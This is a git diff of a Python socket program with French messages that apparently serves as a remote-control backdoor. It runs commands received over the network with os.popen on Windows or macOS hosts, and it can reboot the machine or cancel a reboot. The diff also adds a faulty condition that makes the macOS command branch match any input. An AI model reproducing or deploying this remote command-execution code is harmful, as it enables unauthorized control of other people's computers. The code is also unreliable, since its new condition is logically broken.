@@ -12,7 +12,7 @@ def reply(conn):
         conn.send(reply.encode())
 
 
-def reception(conn, server_socket, systeme_exploit, ipaddr):
+def reception(conn,systeme_exploit,ipaddr):
     while True:
         data = conn.recv(1024).decode()
         print(data)
@@ -48,8 +48,13 @@ def reception(conn, server_socket, systeme_exploit, ipaddr):
             conn.send(essai.encode())
         if data == 'kill':
             os.popen("shutdown /r").read()
-            avertissement = "[!] Le Serveur va redémarrer dans >1 min"
+            avertissement = "\n[!] Le Serveur va redémarrer dans >1 min \n[!]La connection va être perdue"
             conn.send(avertissement.encode())
+        
+        if data == 'kill -c':
+            os.popen("shutdown /a").read()
+            info = "\n[!] L'arrêt planifié a été annulé"
+            conn.send(info.encode())
         try:
             if data == (f'dos:{data_split1}'):
                 if systeme_exploit == 'windows':
@@ -75,7 +80,7 @@ def reception(conn, server_socket, systeme_exploit, ipaddr):
             pass
 
         try:
-            if data == (f'MacOS:{data_split1}'):
+            if data == (f'MacOS:{data_split1}') or (f'macos:{data_split1}'):
                 if systeme_exploit == 'darwin':
                     task = os.popen(f"{data_split1}").read()
                     print(task)
@@ -127,7 +132,7 @@ if __name__ == '__main__':
             task_reply = threading.Thread(target=reply, args=[conn])
             task_reply.start()
             task_reception = threading.Thread(
-                target=reception, args=[conn, server_socket, systeme_exploit, ipaddr])
+                target=reception, args=[conn, systeme_exploit, ipaddr])
             task_reception.start()
         except (ConnectionResetError, ConnectionAbortedError, EOFError):
             print("[!] L'hôte s'est déconnecté . .. ...")
